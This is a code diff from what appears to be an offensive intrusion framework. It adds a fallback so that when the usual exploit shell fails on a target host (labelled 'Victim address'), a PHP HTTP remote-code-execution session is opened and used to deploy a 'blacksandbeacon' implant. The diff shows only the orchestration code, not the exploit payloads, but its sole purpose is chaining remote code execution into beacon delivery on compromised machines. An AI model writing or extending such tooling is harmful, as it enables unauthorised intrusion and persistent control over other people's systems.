@@ -368,6 +368,21 @@ def maybe_beacon_handoff(
     return True
 
 
+def _php2shell_session_for(target: str, payload: dict | None = None):
+    """Resolve a php2shell HTTP RCE session for one host (import seam).
+
+    Args:
+        target: Victim address.
+        payload: Payload mapping override.
+
+    Returns:
+        A live :class:`modules.php2shell_rce.Php2ShellSession`, or None.
+    """
+    from modules.php2shell_rce import session_for_target
+
+    return session_for_target(target, payload=payload)
+
+
 def _handoff_worker(
     target: str,
     source: str,
@@ -417,15 +432,19 @@ def _handoff_worker(
             from modules.atomic_exploit_bridge import open_shell
 
             payload = _load_payload() or {}
+            rce_session = None
             if open_shell(target, lhost=str(payload.get("lhost", "127.0.0.1") or "127.0.0.1")) is None:
-                tlog(f"[handoff] no exec-capable shell for {target}; cannot deliver beacon")
-                _mark_status(target, sessions_dir, "failed")
-                return
+                rce_session = _php2shell_session_for(target, payload=payload)
+                if rce_session is None:
+                    tlog(f"[handoff] no exec-capable shell or php2shell RCE for {target}; cannot deliver beacon")
+                    _mark_status(target, sessions_dir, "failed")
+                    return
+                tlog(f"[handoff] php2shell HTTP RCE session confirmed on {target}")
         except Exception as exc:
             tlog(f"[handoff] shell open for {target} failed: {exc}")
             _mark_status(target, sessions_dir, "failed")
             return
-        result = deploy_client("blacksandbeacon", target, wait=wait_s)
+        result = deploy_client("blacksandbeacon", target, wait=wait_s, session=rce_session)
         if not result.get("success"):
             tlog(f"[handoff] beacon deploy failed for {target}: {result.get('reason', 'unknown')}")
             _mark_status(target, sessions_dir, "failed")
